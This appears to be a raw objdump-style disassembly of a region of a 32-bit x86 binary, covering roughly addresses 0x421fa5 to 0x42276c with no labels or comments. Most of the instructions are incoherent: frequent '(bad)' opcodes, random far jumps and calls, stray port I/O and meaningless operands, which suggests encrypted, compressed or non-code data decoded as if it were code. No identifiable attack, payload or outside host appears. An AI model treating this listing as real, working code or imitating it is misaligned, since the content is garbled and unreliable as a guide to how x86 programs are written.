  421fa5:	xchg   BYTE PTR [esi+0x10017cee],al
  421fab:	jmp    0x421f33
  421fad:	inc    eax
  421fae:	addr16 (bad) 
  421fb0:	mov    cl,0xd3
  421fb2:	push   eax
  421fb3:	sbb    al,0xb2
  421fb5:	es sti 
  421fb7:	jnp    0x422036
  421fb9:	(bad)  
  421fba:	enter  0xf293,0xdc
  421fbe:	ret    
  421fbf:	aam    0x6e
  421fc1:	stc    
  421fc2:	mov    cl,0x6b
  421fc4:	retf   0x43f2
  421fc7:	inc    esp
  421fc8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421fc9:	jg     0x421f8d
  421fcb:	xor    cl,BYTE PTR [edi+0x3f]
  421fce:	dec    ecx
  421fcf:	dec    edi
  421fd0:	xchg   ecx,eax
  421fd1:	enter  0xe5cb,0xd3
  421fd5:	xor    eax,0x9c0e4216
  421fda:	rcl    BYTE PTR [esi+0x74c5eaee],1
  421fe0:	inc    ebx
  421fe1:	fcom   DWORD PTR [ecx]
  421fe3:	sub    DWORD PTR [edx-0x22439ad1],esp
  421fe9:	neg    edx
  421feb:	adc    eax,0x90e37476
  421ff0:	mov    ebx,DWORD PTR [ebp-0x12542fac]
  421ff6:	inc    edx
  421ff7:	aad    0xa1
  421ff9:	mov    ch,0x5b
  421ffb:	inc    ebx
  421ffc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421ffd:	cmp    DWORD PTR [ecx+0x46ce673e],esi
  422003:	aaa    
  422004:	(bad)  
  422006:	pop    ecx
  422007:	(bad)
  42200a:	scas   al,BYTE PTR es:[edi]
  42200b:	or     al,0x7a
  42200d:	jo     0x421f9f
  42200f:	call   0xc885:0x21d55c49
  422016:	adc    BYTE PTR [esi],0x57
  422019:	sbb    DWORD PTR [ecx],eax
  42201b:	xchg   esp,eax
  42201c:	mov    bl,0xc3
  42201e:	ins    DWORD PTR es:[edi],dx
  42201f:	sub    dh,bl
  422021:	and    BYTE PTR es:[ebp+0x380fff46],dh
  422028:	inc    ecx
  422029:	out    dx,al
  42202a:	jmp    0x7176:0x994cff14
  422031:	scas   al,BYTE PTR es:[edi]
  422032:	push   es
  422033:	outs   dx,DWORD PTR ds:[esi]
  422034:	aaa    
  422035:	and    ecx,DWORD PTR [ebx+0x25a7f4c5]
  42203b:	mov    eax,ds:0x31065c65
  422040:	retf   0xf274
  422043:	enter  0xd701,0x8e
  422047:	push   edx
  422048:	jne    0x422020
  42204a:	(bad)  
  42204b:	stos   DWORD PTR es:[edi],eax
  42204c:	ret    
  42204d:	add    DWORD PTR ds:0x9d9e12cf,esi
  422053:	ins    DWORD PTR es:[edi],dx
  422054:	inc    ecx
  422055:	inc    edi
  422056:	push   eax
  422057:	pushf  
  422058:	rcl    BYTE PTR [eax-0x63],1
  42205b:	mov    ah,0x23
  42205d:	push   ecx
  42205e:	lea    esi,[ecx-0x7a1256eb]
  422064:	cmp    esp,DWORD PTR [ecx]
  422066:	xor    esp,DWORD PTR [edi+edi*1-0x4b041b4b]
  42206d:	popf   
  42206e:	lahf   
  42206f:	repnz pop ds
  422071:	cmp    edx,DWORD PTR [ebp+0xe76b681]
  422077:	stos   BYTE PTR es:[edi],al
  422078:	ss sbb eax,0x76b06ada
  42207e:	pop    edi
  42207f:	call   0x6000d360
  422084:	ss stos DWORD PTR es:[edi],eax
  422086:	dec    edi
  422087:	cwde   
  422088:	mov    dh,0xab
  42208a:	jp     0x4220bc
  42208c:	lods   al,BYTE PTR ds:[esi]
  42208d:	inc    esp
  42208e:	retf   
  42208f:	adc    BYTE PTR [ebx-0x115b4203],0xed
  422096:	pop    ebp
  422097:	das    
  422098:	pusha  
  422099:	cwde   
  42209a:	push   esi
  42209b:	mov    cl,bh
  42209d:	inc    eax
  42209e:	test   al,0x59
  4220a0:	or     al,0xbd
  4220a2:	mov    eax,0x1ffd139d
  4220a7:	out    0x28,al
  4220a9:	lods   eax,DWORD PTR ds:[esi]
  4220aa:	in     al,0x3d
  4220ac:	jnp    0x422101
  4220ae:	push   es
  4220af:	mov    ch,0x11
  4220b1:	and    eax,0x525b8927
  4220b6:	cli    
  4220b7:	into   
  4220b8:	inc    ecx
  4220b9:	and    DWORD PTR [ecx-0x2e],ebx
  4220bc:	push   edi
  4220bd:	cmp    dl,BYTE PTR [ebp+ebp*4+0x61]
  4220c1:	dec    esi
  4220c2:	js     0x42204a
  4220c4:	push   ecx
  4220c5:	pushf  
  4220c6:	xlat   BYTE PTR ds:[ebx]
  4220c7:	sahf   
  4220c8:	push   eax
  4220c9:	dec    bp
  4220cb:	mov    edx,0x1340d15b
  4220d0:	push   ss
  4220d1:	ins    BYTE PTR es:[edi],dx
  4220d2:	xor    DWORD PTR [edi+0x3b],edx
  4220d5:	jo     0x422087
  4220d7:	mov    edx,0x70f7830e
  4220dc:	push   edx
  4220dd:	and    eax,0xf061def6
  4220e2:	dec    eax
  4220e3:	jp     0x422090
  4220e5:	pop    edx
  4220e6:	cld    
  4220e7:	outs   dx,DWORD PTR ds:[esi]
  4220e8:	xor    ebx,DWORD PTR [eax+0x6e]
  4220eb:	js     0x42215f
  4220ed:	mov    eax,ds:0xa439532f
  4220f2:	outs   dx,DWORD PTR ds:[esi]
  4220f3:	jle    0x422149
  4220f5:	xchg   edi,eax
  4220f6:	jns    0x42216b
  4220f8:	bnd jmp 0x4220d6
  4220fb:	ret    0x74d1
  4220fe:	mov    dh,0xce
  422100:	and    eax,0xee3046ca
  422105:	(bad)  
  422107:	pop    DWORD PTR [edi+eax*1+0x62]
  42210b:	and    eax,0xffdb31bd
  422110:	lds    ebp,FWORD PTR [edx+0x56]
  422113:	cli    
  422114:	outs   dx,DWORD PTR ds:[esi]
  422115:	pop    esp
  422116:	ss xchg edi,eax
  422118:	push   ebx
  422119:	mov    BYTE PTR [ecx-0x7b],dl
  42211c:	sub    BYTE PTR [ecx+0x3eedf973],dh
  422122:	xchg   ecx,eax
  422123:	into   
  422124:	adc    al,0x91
  422126:	push   ebp
  422127:	adc    ch,BYTE PTR [eax+0x7d]
  42212a:	and    BYTE PTR [edx+0x24e0460e],ch
  422130:	pop    esp
  422131:	jge    0x4220e8
  422133:	inc    esi
  422134:	(bad)  
  422135:	pop    ebx
  422136:	ds jg  0x4220f2
  422139:	popf   
  42213a:	ret    
  42213b:	aam    0x73
  42213d:	ja     0x42212c
  42213f:	daa    
  422140:	inc    ebx
  422141:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422142:	leave  
  422143:	jns    0x422101
  422145:	cld    
  422146:	add    al,0x99
  422148:	ret    
  422149:	shl    BYTE PTR ds:0xcd5ad7bd,cl
  42214f:	sahf   
  422150:	xor    ecx,DWORD PTR [eax]
  422152:	call   0xf635e684
  422157:	sub    al,0xea
  422159:	xchg   esp,eax
  42215a:	arpl   WORD PTR [ecx+0x503c89d6],bp
  422160:	imul   esi,DWORD PTR [edx+0x76f6b22d],0x3b
  422167:	jne    0x42212d
  422169:	jmp    0x4221af
  42216b:	push   0x5a
  42216d:	fcmovnb st,st(4)
  42216f:	dec    edx
  422170:	sub    DWORD PTR [ebx-0x34201444],ebp
  422176:	jb     0x42210c
  422178:	mov    dl,0x3b
  42217a:	repnz idiv BYTE PTR [esi-0xb]
  42217e:	arpl   si,ax
  422180:	idiv   BYTE PTR [ebp+0x18]
  422183:	xchg   esi,eax
  422184:	mov    ebx,0x24ad9cb1
  422189:	dec    ecx
  42218a:	and    DWORD PTR [eax+0x1af4],esp
	...
  422198:	add    BYTE PTR [eax],al
  42219a:	push   ebx
  42219b:	(bad)  
  42219c:	(bad)  
  42219d:	push   esi
  42219e:	(bad)  
  42219f:	jle    0x42219c
  4221a1:	xlat   BYTE PTR ds:[ebx]
  4221a2:	retf   
  4221a3:	push   ds
  4221a4:	test   DWORD PTR [ebp+0xf],0xd41387d8
  4221ab:	pushf  
  4221ac:	add    DWORD PTR [eax],eax
  4221ae:	cld    
  4221af:	add    DWORD PTR [eax],eax
  4221b1:	add    cl,bh
  4221b3:	rcl    BYTE PTR [edx-0x5863564],0x9
  4221ba:	aaa    
  4221bb:	pop    ss
  4221bc:	inc    edi
  4221bd:	xchg   ebp,eax
  4221be:	in     al,0x4e
  4221c0:	mov    bl,0x66
  4221c2:	adc    eax,DWORD PTR [eax-0x65296ab6]
  4221c8:	xor    BYTE PTR [edx*8-0x2b47b3d],bh
  4221cf:	mov    dl,0xfe
  4221d1:	xlat   BYTE PTR ds:[ebx]
  4221d2:	dec    edi
  4221d3:	sub    bh,BYTE PTR [esi-0x6a]
  4221d6:	cmc    
  4221d7:	mov    ah,0xc2
  4221d9:	or     al,BYTE PTR [edx]
  4221db:	adc    al,0x51
  4221dd:	xchg   ecx,eax
  4221de:	dec    edx
  4221df:	push   ebx
  4221e0:	icebp  
  4221e1:	iret   
  4221e2:	sbb    BYTE PTR [eax],0xec
  4221e5:	in     al,dx
  4221e6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4221e7:	add    DWORD PTR [ecx+ecx*8],ebp
  4221ea:	fcomip st,st(2)
  4221ec:	aaa    
  4221ed:	mov    dh,0x2d
  4221ef:	jb     0x42218b
  4221f1:	pop    ss
  4221f2:	mov    ds:0x695057df,al
  4221f7:	fwait
  4221f8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4221f9:	or     BYTE PTR [ebp+0x55ee7d67],0xbf
  422200:	sbb    DWORD PTR [edx],eax
  422202:	and    eax,0x1479cff8
  422207:	push   ss
  422208:	or     al,BYTE PTR [edx+0x202498ee]
  42220e:	jp     0x422228
  422210:	add    DWORD PTR [edx-0x11],0xb0fa4be
  422217:	sub    DWORD PTR [ecx-0x1],ebx
  42221a:	xchg   dx,ax
  42221c:	mov    eax,edi
  42221e:	ficom  DWORD PTR [ecx+0x1b2fb00c]
  422224:	mov    ds:0xda012f5,eax
  422229:	stos   BYTE PTR es:[edi],al
  42222a:	test   ebp,ecx
  42222c:	dec    edx
  42222d:	in     al,0xe0
  42222f:	fldcw  WORD PTR [eax-0x5cce532e]
  422235:	push   0xff5bf196
  42223a:	out    dx,eax
  42223b:	(bad)  
  42223c:	dec    ebp
  42223d:	inc    esi
  42223e:	push   ds
  42223f:	fistp  QWORD PTR [ebx+ecx*2+0x3f]
  422243:	sub    BYTE PTR [edx],cl
  422245:	or     DWORD PTR [edx-0x79],esi
  422248:	dec    edx
  422249:	pop    ss
  42224a:	(bad)  
  42224b:	outs   dx,BYTE PTR ds:[esi]
  42224c:	xor    eax,0xc14618e9
  422251:	ret    0xfdb4
  422254:	inc    esi
  422255:	or     DWORD PTR [edi-0x7f],eax
  422258:	mov    al,ds:0x5843d14d
  42225d:	xchg   BYTE PTR [esi+0x11],bl
  422260:	sbb    dh,BYTE PTR [edx+0x30f4a5b2]
  422266:	fild   QWORD PTR [eax]
  422268:	pop    ds
  422269:	hlt    
  42226a:	inc    edi
  42226b:	xor    esi,eax
  42226d:	test   al,0xca
  42226f:	lds    ecx,FWORD PTR [eax]
  422271:	rcl    DWORD PTR [ebx-0x6987ed9c],1
  422277:	dec    edi
  422278:	mov    dl,0x7c
  42227a:	mov    ds:0x545cb044,al
  42227f:	inc    ebx
  422280:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422281:	xchg   esi,eax
  422282:	jno    0x42227e
  422284:	aad    0xde
  422286:	add    BYTE PTR [ebp+0x695d77bb],dl
  42228c:	mov    ds:0x5e173e6e,al
  422291:	test   al,0x89
  422293:	fcom   QWORD PTR [edx+esi*4-0xe09f58]
  42229a:	(bad)  
  42229b:	fdivrp st(7),st
  42229d:	mov    WORD PTR [ecx+0x253ab4c7],es
  4222a3:	sub    al,0x4f
  4222a5:	sbb    DWORD PTR [eax],edx
  4222a7:	pop    ecx
  4222a8:	cmp    DWORD PTR [esp+ebx*4-0x72d0d8e3],esp
  4222af:	cmp    bh,BYTE PTR [ebx+ecx*1-0x3e]
  4222b3:	scas   eax,DWORD PTR es:[edi]
  4222b4:	jb     0x4222fd
  4222b6:	xor    DWORD PTR [ebp-0x7a49d13e],ebx
  4222bc:	pop    esi
  4222bd:	call   0xafa3:0xa8419c2d
  4222c4:	or     cl,BYTE PTR [edi+0x1ec769cb]
  4222ca:	div    DWORD PTR [esi]
  4222cc:	mov    esp,0xba20fe44
  4222d1:	imul   eax,DWORD PTR [eax],0x6f520b86
  4222d7:	repnz mov esi,0x69b70b61
  4222dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4222de:	xchg   edi,eax
  4222df:	ss jb  0x422339
  4222e2:	test   eax,0xf58baebb
  4222e7:	fs cs jg 0x42235b
  4222eb:	adc    DWORD PTR [edx-0x62],edx
  4222ee:	push   ecx
  4222ef:	sub    eax,DWORD PTR [esi+0xe30d1fa]
  4222f5:	out    0x7,eax
  4222f7:	cmp    BYTE PTR [edx-0x12511fbb],al
  4222fd:	dec    esp
  4222fe:	mov    bl,0x87
  422300:	push   edx
  422301:	pop    di
  422303:	pushf  
  422304:	pushf  
  422305:	jecxz  0x4222c8
  422307:	xchg   edx,eax
  422308:	sub    ebx,esi
  42230a:	nop
  42230b:	cli    
  42230c:	mov    bl,0xe0
  42230e:	out    0xd6,al
  422310:	mov    al,ch
  422312:	xchg   ebp,eax
  422313:	ss xchg esi,eax
  422315:	scas   eax,DWORD PTR es:[edi]
  422316:	vandnps xmm6,xmm6,XMMWORD PTR [esi]
  42231a:	dec    ebx
  42231b:	pop    ebx
  42231c:	imul   ecx,DWORD PTR [eax+0x11],0xffffff95
  422320:	xchg   edi,eax
  422321:	or     eax,0x624e6c03
  422326:	pop    ebx
  422327:	sti    
  422328:	pop    ebp
  422329:	jmp    0xb99fb99a
  42232e:	(bad)  
  42232f:	or     eax,0xca2df79b
  422334:	mov    ebp,0x23689be
  422339:	mov    bh,0xd0
  42233b:	push   ecx
  42233c:	call   0x8a3c8cea
  422341:	adc    DWORD PTR [edx+edi*2+0x4e040746],eax
  422348:	xor    dl,BYTE PTR ds:0xeaca4966
  42234e:	inc    ebp
  42234f:	pop    ss
  422350:	dec    ebp
  422351:	ror    BYTE PTR [edi+eiz*2+0x3ede1303],1
  422358:	es inc ebp
  42235a:	nop
  42235b:	cmp    BYTE PTR [ebx-0x27f06ef4],0x75
  422362:	and    cl,BYTE PTR [edi-0x7797b522]
  422368:	adc    bl,BYTE PTR [esi+0x42]
  42236b:	out    0x27,al
  42236d:	sub    cl,BYTE PTR [eax+0xe]
  422370:	or     eax,DWORD PTR [edx+0x20]
  422373:	mov    WORD PTR [ebx],gs
  422375:	and    BYTE PTR [eax],bl
  422377:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422378:	jno    0x4223c7
  42237a:	cli    
  42237b:	(bad)  
  42237c:	mov    eax,ds:0x5187781b
  422381:	pop    es
  422382:	fucomi st,st(5)
  422384:	dec    eax
  422385:	shr    DWORD PTR [esi],0xa1
  422388:	icebp  
  422389:	scas   al,BYTE PTR es:[edi]
  42238a:	cdq    
  42238b:	cmp    bh,BYTE PTR [ecx]
  42238d:	call   0x10f6:0xfe38c7f7
  422394:	rol    DWORD PTR [esi+0x5dd40952],0x5c
  42239b:	xor    bh,BYTE PTR [ecx+0x14f05dce]
  4223a1:	in     eax,0x37
  4223a3:	and    esi,edi
  4223a5:	add    esp,DWORD PTR [esi-0x22]
  4223a8:	mov    bl,0x24
  4223aa:	aas    
  4223ab:	sbb    al,bl
  4223ad:	jns    0x4223af
	...
  4223b7:	add    BYTE PTR [eax],al
  4223b9:	add    BYTE PTR [ecx],dl
  4223bb:	push   cs
  4223bc:	or     dl,ch
  4223be:	pop    ds
  4223bf:	out    dx,al
  4223c0:	repz jmp FWORD PTR [ecx-0x6c]
  4223c4:	fucomp st(0)
  4223c6:	icebp  
  4223c7:	adc    DWORD PTR [ebp+0x75],ebp
  4223ca:	rcr    BYTE PTR [esi+0x1fc0001],1
  4223d0:	add    BYTE PTR [eax],al
  4223d2:	sbb    edi,DWORD PTR [ecx]
  4223d4:	js     0x4223af
  4223d6:	cmp    DWORD PTR [esi+0x2c],edi
  4223d9:	lods   eax,DWORD PTR ds:[esi]
  4223da:	sub    bl,0x12
  4223dd:	and    al,0x82
  4223df:	pop    esp
  4223e0:	test   BYTE PTR [ecx+0x36f4d375],0x9a
  4223e7:	pop    ss
  4223e8:	jmp    0x7676:0x175358d6
  4223ef:	clc    
  4223f0:	or     BYTE PTR [edi+0x7c7abe38],0xdf
  4223f7:	and    BYTE PTR [esi-0x3133b85a],ch
  4223fd:	inc    ebx
  4223fe:	aad    0x14
  422400:	mov    ch,0x5d
  422402:	mov    esp,0x90baa449
  422407:	lds    ebp,FWORD PTR [esi-0x39]
  42240a:	inc    ebp
  42240b:	(bad)  
  42240c:	nop
  42240d:	dec    ebx
  42240e:	mov    BYTE PTR [ebp-0x7],0x83
  422412:	sbb    BYTE PTR [edx+0x29021c25],cl
  422418:	push   eax
  422419:	outs   dx,BYTE PTR ds:[esi]
  42241a:	inc    DWORD PTR [edx+eax*8+0x65dda0fa]
  422421:	jecxz  0x422429
  422423:	mov    ebx,0x901055e9
  422428:	leave  
  422429:	es loope 0x422438
  42242c:	inc    ebp
  42242d:	(bad)  
  42242e:	test   al,0x81
  422430:	imul   ebx,esi,0xffffffba
  422433:	mov    edi,0xeb677ce9
  422438:	xor    ebx,DWORD PTR [eax]
  42243a:	lea    edx,[edi+ebx*4-0xe2efffc]
  422441:	mov    eax,0x1d51cd18
  422446:	add    eax,0xbcb9200b
  42244c:	sub    eax,0xcb488d72
  422451:	into   
  422452:	jmp    0x53c1dc8
  422457:	xchg   esp,eax
  422458:	lds    eax,FWORD PTR [ebp+0x50]
  42245b:	pop    esi
  42245c:	dec    ecx
  42245d:	push   eax
  42245e:	fld    QWORD PTR [eax]
  422460:	pop    edi
  422461:	jp     0x4224de
  422463:	pop    ebp
  422464:	in     al,0x15
  422466:	push   edi
  422467:	bound  eax,QWORD PTR [esi-0x1826e606]
  42246d:	dec    edi
  42246e:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  422470:	mov    bh,0xb1
  422472:	into   
  422473:	cld    
  422474:	sub    ebx,edx
  422476:	stos   DWORD PTR es:[edi],eax
  422477:	stc    
  422478:	loope  0x42249a
  42247a:	jne    0x42244a
  42247c:	les    eax,FWORD PTR [ebp+0x38]
  42247f:	or     al,0xf0
  422481:	das    
  422482:	cdq    
  422483:	ins    BYTE PTR es:[edi],dx
  422484:	xor    edx,DWORD PTR [esi+esi*1]
  422487:	retf   
  422488:	mov    esp,ecx
  42248a:	(bad)  
  42248b:	js     0x422503
  42248d:	inc    eax
  42248e:	lods   al,BYTE PTR ds:[esi]
  42248f:	push   ebx
  422490:	inc    edx
  422491:	rol    DWORD PTR [ebx],1
  422493:	or     al,BYTE PTR [ecx]
  422495:	stos   DWORD PTR es:[edi],eax
  422496:	stos   DWORD PTR es:[edi],eax
  422497:	cmp    bl,al
  422499:	or     BYTE PTR ds:0xc20a2804,ah
  42249f:	dec    ebp
  4224a0:	push   ss
  4224a1:	retf   0xec6a
  4224a4:	fld    DWORD PTR [esi+0x3ac7abe]
  4224aa:	xchg   ecx,eax
  4224ab:	xchg   ebp,eax
  4224ac:	push   ebx
  4224ad:	xchg   ecx,eax
  4224ae:	inc    ecx
  4224af:	cmp    DWORD PTR [edx+0x3f],0xffffffe3
  4224b3:	pop    ecx
  4224b4:	sub    BYTE PTR [ecx],ah
  4224b6:	add    eax,0xfe049f5
  4224bb:	xchg   ecx,eax
  4224bc:	xchg   ebx,eax
  4224bd:	call   0xdc0:0x5d0930f
  4224c4:	lods   al,BYTE PTR ds:[esi]
  4224c5:	loope  0x4224bc
  4224c7:	mov    esp,0x5ee5e041
  4224cc:	mov    ch,0xb6
  4224ce:	aam    0x27
  4224d0:	sub    eax,0x4a50f8e0
  4224d5:	imul   ebx,DWORD PTR [ecx],0xffffffba
  4224d8:	fild   WORD PTR [esi+edi*8-0x358c1e24]
  4224df:	and    dh,BYTE PTR [edi]
  4224e1:	aaa    
  4224e2:	and    DWORD PTR [eax+0x61d9ef4],ebp
  4224e8:	mov    esp,0xeddf09e3
  4224ed:	imul   ebx,edi,0x42
  4224f0:	mov    esi,0x745e5074
  4224f5:	dec    DWORD PTR [edx-0x19f7fda1]
  4224fb:	je     0x422516
  4224fd:	pop    ecx
  4224fe:	scas   al,BYTE PTR es:[edi]
  4224ff:	mov    edi,DWORD PTR [ebx-0x6b0e4eb9]
  422505:	jle    0x42249c
  422507:	dec    ebx
  422508:	scas   al,BYTE PTR es:[edi]
  422509:	ror    ch,0x71
  42250c:	imul   DWORD PTR [edx+ebx*1]
  42250f:	inc    edx
  422510:	pusha  
  422511:	sbb    ah,bh
  422513:	ins    DWORD PTR es:[edi],dx
  422514:	fwait
  422515:	jp     0x4224c0
  422517:	daa    
  422518:	std    
  422519:	(bad)  
  42251a:	iret   
  42251b:	xor    dl,bl
  42251d:	popf   
  42251e:	sub    al,0x7c
  422520:	ins    DWORD PTR es:[edi],dx
  422521:	gs dec esp
  422523:	mov    dh,BYTE PTR [edx-0x60]
  422526:	imul   ebp,DWORD PTR [edi],0x19
  422529:	ss pop esp
  42252b:	jns    0x4224c5
  42252d:	std    
  42252e:	popf   
  42252f:	int3   
  422530:	xchg   edx,eax
  422531:	dec    ecx
  422532:	cmp    eax,0x506c46bd
  422537:	pop    ecx
  422538:	inc    edi
  422539:	mov    ds:0xa879905a,al
  42253e:	push   0xffffffe7
  422540:	push   0xd5a1a7d7
  422545:	xchg   BYTE PTR [edx-0x3b77b7bf],cl
  42254b:	scas   eax,DWORD PTR es:[edi]
  42254c:	imul   ebx,DWORD PTR [eax-0x64e501bf],0xfe25ed39
  422556:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422557:	dec    eax
  422558:	xor    BYTE PTR [ebx-0x66],al
  42255b:	cli    
  42255c:	mov    ds:0x4e9b9f05,eax
  422561:	out    0xf1,eax
  422563:	js     0x422512
  422565:	lods   eax,DWORD PTR ss:[esi]
  422567:	dec    ebp
  422568:	pop    ebp
  422569:	stos   DWORD PTR es:[edi],eax
  42256a:	rcr    DWORD PTR [eax+eiz*4],cl
  42256d:	out    0xf9,eax
  42256f:	mov    DWORD PTR [eax+0x4e],eax
  422572:	stc    
  422573:	mov    ds:0xe820bd41,al
  422578:	iret   
  422579:	xor    BYTE PTR gs:[ebp+0x3c],bl
  42257d:	mov    eax,ds:0x75b43a50
  422582:	xchg   edx,eax
  422583:	sbb    DWORD PTR [esi-0x3a],esp
  422586:	fcom   st(3)
  422588:	xlat   BYTE PTR ds:[ebx]
  422589:	mov    esi,0xb9d44153
  42258e:	nop
  42258f:	pop    ebx
  422590:	inc    esi
  422591:	mov    ecx,0x62444e5b
  422596:	pop    ebx
  422597:	xlat   BYTE PTR ds:[ebx]
  422598:	xlat   BYTE PTR ds:[ebx]
  422599:	ror    ch,0x59
  42259c:	jecxz  0x42260d
  42259e:	lds    eax,FWORD PTR [edx+esi*1+0x35b52485]
  4225a5:	inc    edx
  4225a6:	push   0xffffffd1
  4225a8:	pushf  
  4225a9:	daa    
  4225aa:	jle    0x4225bb
  4225ac:	xchg   ecx,eax
  4225ad:	mov    eax,0x57d654c
  4225b2:	jmp    0x5930:0xdf8495bc
  4225b9:	dec    ecx
  4225ba:	jecxz  0x4225b4
  4225bc:	push   ebp
  4225bd:	ins    BYTE PTR es:[edi],dx
  4225be:	mov    eax,ds:0xf3e9ad1
  4225c3:	fiadd  WORD PTR [edx-0x7e]
  4225c6:	ds nop
  4225c8:	jbe    0x422586
  4225ca:	sbb    eax,0x7b1866
	...
  4225d7:	add    BYTE PTR [eax],al
  4225d9:	add    cl,cl
  4225db:	xchg   esi,eax
  4225dc:	ins    DWORD PTR es:[edi],dx
  4225dd:	mov    dh,0x7f
  4225df:	(bad)  
  4225e0:	(bad)  
  4225e2:	out    0x3f,al
  4225e4:	nop
  4225e5:	sbb    ebp,ebp
  4225e7:	popa   
  4225e8:	ds or  cl,ah
  4225eb:	mov    al,ds:0x1fc0001
  4225f0:	add    BYTE PTR [eax],al
  4225f2:	dec    esi
  4225f3:	lea    ebx,[ecx+0x3eb88f73]
  4225f9:	xlat   BYTE PTR ds:[ebx]
  4225fa:	mov    WORD PTR [edx+esi*1+0x72724ca7],gs
  422601:	sub    dl,BYTE PTR [ecx]
  422603:	cmc    
  422604:	inc    esp
  422605:	inc    ebx
  422606:	xchg   BYTE PTR [edi+0x7f65fe0b],bl
  42260c:	mov    bh,0x3b
  42260e:	mov    ebp,0x896d8905
  422613:	push   cs
  422614:	(bad)  
  422615:	xchg   ebx,eax
  422616:	or     DWORD PTR [ecx],0x61fb55cf
  42261c:	dec    ecx
  42261d:	fdiv   st,st(1)
  42261f:	mov    bl,0x9d
  422621:	int3   
  422622:	mov    ch,0xfe
  422624:	jo     0x42268c
  422626:	(bad)  
  422627:	lods   al,BYTE PTR gs:[esi]
  422629:	jbe    0x42262f
  42262b:	lds    eax,FWORD PTR [esi+0x2b]
  42262e:	test   al,0x7c
  422630:	mov    ebx,0x646a68a7
  422635:	jmp    DWORD PTR [esi-0x221d4f1]
  42263b:	xor    dh,BYTE PTR [esi-0x42]
  42263e:	pop    ss
  42263f:	hlt    
  422640:	mov    WORD PTR [esi],fs
  422642:	dec    esi
  422643:	mov    al,ds:0xdd518d4
  422648:	sub    eax,0x28feb636
  42264d:	mov    esi,0xd082fff6
  422652:	test   eax,0xa3650daf
  422657:	out    dx,eax
  422658:	dec    eax
  422659:	fist   WORD PTR [ebx+0x32]
  42265c:	add    eax,0x79a7c865
  422661:	inc    eax
  422662:	xchg   ebx,eax
  422663:	lock cmp BYTE PTR [eax-0x78],dh
  422667:	mov    al,0xe9
  422669:	cmp    edi,DWORD PTR [ecx-0x3435cfec]
  42266f:	mov    esi,0x3d3d442e
  422674:	xor    bh,BYTE PTR [edi]
  422676:	loopne 0x4226e5
  422678:	sbb    al,0xa9
  42267a:	test   eax,0x52e4ddbb
  42267f:	loop   0x422611
  422681:	pop    esp
  422682:	aad    0x8c
  422684:	mov    gs,WORD PTR [ebx-0x77]
  422687:	imul   ebx,DWORD PTR [edx-0x57],0xffffffe7
  42268b:	sbb    al,0x1d
  42268d:	xor    BYTE PTR [eax],dl
  42268f:	jae    0x4226e7
  422691:	retf   0x541c
  422694:	sbb    al,0x23
  422696:	mov    WORD PTR [esi+0x4b],?
  422699:	shl    DWORD PTR [esi],cl
  42269b:	lahf   
  42269c:	dec    ebx
  42269d:	xchg   esi,eax
  42269e:	(bad)  
  42269f:	sbb    BYTE PTR ds:0x5d7c0d96,bh
  4226a5:	jnp    0x42269f
  4226a7:	mov    bl,0xf9
  4226a9:	mov    dl,0x37
  4226ab:	std    
  4226ac:	pop    ss
  4226ad:	xor    dl,cl
  4226af:	jne    0x42266f
  4226b1:	dec    ebp
  4226b2:	or     DWORD PTR [ebp+esi*1-0x54],edx
  4226b6:	adc    DWORD PTR [esi+0x31],0x85a96344
  4226bd:	stc    
  4226be:	test   bl,dh
  4226c0:	mov    dl,BYTE PTR [edi+ebx*4+0x5b]
  4226c4:	idiv   DWORD PTR [ecx-0x5e]
  4226c7:	sbb    DWORD PTR [ebp+0x38],ebp
  4226ca:	cmp    edx,DWORD PTR [ecx+0x46bfabf8]
  4226d0:	push   es
  4226d1:	(bad)  
  4226d3:	inc    edi
  4226d4:	(bad)  
  4226d5:	call   0xaa3c61d8
  4226da:	(bad)  
  4226db:	loope  0x42273e
  4226dd:	pop    ecx
  4226de:	retf   
  4226df:	bound  ecx,QWORD PTR cs:[ecx]
  4226e2:	and    bh,BYTE PTR [eax]
  4226e4:	fwait
  4226e5:	pop    edi
  4226e6:	push   ds
  4226e7:	ror    DWORD PTR [edx-0x5a00f969],1
  4226ed:	xor    BYTE PTR [edi],0x6a
  4226f0:	and    DWORD PTR [esi-0x5b],0x39
  4226f4:	jp     0x4226ec
  4226f6:	int3   
  4226f7:	or     BYTE PTR ds:0x8dac88fb,dh
  4226fd:	adc    BYTE PTR ss:[ebp-0x3daf1f36],ch
  422704:	retf   0xb46d
  422707:	xchg   esi,eax
  422708:	xchg   edx,eax
  422709:	int3   
  42270a:	adc    DWORD PTR [edi+0x5],0xcdcaba1a
  422711:	mov    dh,0x7a
  422713:	jmp    0xb915:0xa27582fb
  42271a:	mul    ebx
  42271c:	and    dh,cl
  42271e:	add    DWORD PTR [esp+edx*8],ecx
  422721:	loop   0x422737
  422723:	bound  edx,QWORD PTR [edx]
  422725:	mov    bh,0x3a
  422727:	pop    ecx
  422728:	stos   BYTE PTR es:[edi],al
  422729:	mov    ?,WORD PTR [edx]
  42272b:	das    
  42272c:	mov    WORD PTR [ebx-0x45be2edf],?
  422732:	jp     0x4226d5
  422734:	push   esi
  422735:	(bad)  
  422736:	push   edi
  422737:	jmp    0x422741
  422739:	pop    ebx
  42273a:	inc    DWORD PTR [esi-0x25]
  42273d:	xchg   edx,eax
  42273e:	ins    DWORD PTR es:[edi],dx
  42273f:	(bad)  
  422740:	fisubr DWORD PTR [edx-0x39]
  422743:	push   edx
  422744:	leave  
  422745:	cdq    
  422746:	push   es
  422747:	je     0x422728
  422749:	jmp    0x2759734a
  42274e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42274f:	push   es
  422750:	repnz sbb BYTE PTR [esi+ebp*1-0x6a],al
  422755:	jecxz  0x42272e
  422757:	add    DWORD PTR [ecx-0x52],0x7c90b8ca
  42275e:	fnstcw WORD PTR [eax+eiz*4+0xa]
  422762:	(bad)  
  422763:	push   eax
  422764:	fcom   QWORD PTR [esi+0x3329f805]
  42276a:	adc    al,0x9d
  42276c:	retf   0x7795
